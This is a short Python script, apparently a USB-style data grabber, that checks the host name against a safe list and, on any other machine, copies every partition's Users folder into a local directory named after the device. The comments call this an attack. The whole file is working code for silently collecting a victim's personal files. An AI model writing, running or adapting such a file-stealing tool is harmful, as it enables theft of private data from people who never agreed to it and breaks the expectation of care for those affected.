
import os
import platform
import shutil
import psutil

SAFEHOSTS = {"LAPTOP-LLDQGKDH"}
TEST = False

folderName = platform.node()
partitions = psutil.disk_partitions()

#Creates a directory with the same name as the device
if not os.path.exists(platform.node()):
    os.mkdir(platform.node())

#checks if it has to attack or not
if(platform.node() not in SAFEHOSTS or TEST):

    #cicles all partitions
    for partition in partitions:

        #select target and destination
        if partition != "SFP_whiskeyInTheJar":
            currentPartDir = os.path.join(folderName, "p"+str(partitions.index(partition)))
            if not os.path.exists(currentPartDir):
                os.mkdir(os.path.join(folderName, "p"+str(partitions.index(partition))))
            destDir = currentPartDir
            string = "Users"
            targetDir = os.path.join(partition.device, rf"{string}")
        else:
            targetDir = ""

        #targetDir = "C:/Users/leona/OneDrive/Documenti/Scuola"

        #copies the files
        if targetDir != "":
            if(os.path.exists(destDir)):
                shutil.rmtree(destDir)
            shutil.copytree(targetDir, destDir)
